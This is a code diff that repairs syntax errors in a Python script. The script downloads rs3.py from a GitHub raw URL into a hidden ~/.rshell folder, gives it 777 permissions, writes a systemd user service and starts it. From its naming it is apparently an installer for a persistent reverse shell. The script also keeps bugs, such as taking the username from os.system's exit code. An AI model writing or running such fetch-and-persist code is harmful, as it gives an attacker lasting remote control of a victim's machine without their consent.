@@ -2,15 +2,13 @@ import shutil
 import os
 from stat import *
 
-improt urllib.request
+import urllib.request
 USERNAME = os.system("whoami")
-RS3 = "https://raw.githubusercontent.com/TarunChakitha/testtest/master/rs3.py'
+RS3 = "https://raw.githubusercontent.com/TarunChakitha/testtest/master/rs3.py"
 
 urllib.request.urlretrieve(RS3, f"/home/{USERNAME}/.rshell/rs3.py")
 
 os.chmod(f"/home/{USERNAME}/.rshell/rs3.py",0o777)
-
-os.mkdir()
 
 with open("~/.config/systemd/user/rs.service","w+") as unit_file:
 	unit_file.write(f"""
@@ -27,7 +25,7 @@ with open("~/.config/systemd/user/rs.service","w+") as unit_file:
 	KillMode=process
 
 	[Install]
-	WantedBy=multi-user.target"""
+	WantedBy=multi-user.target""")
 
 
 os.system("systemctl --user start rs.service")
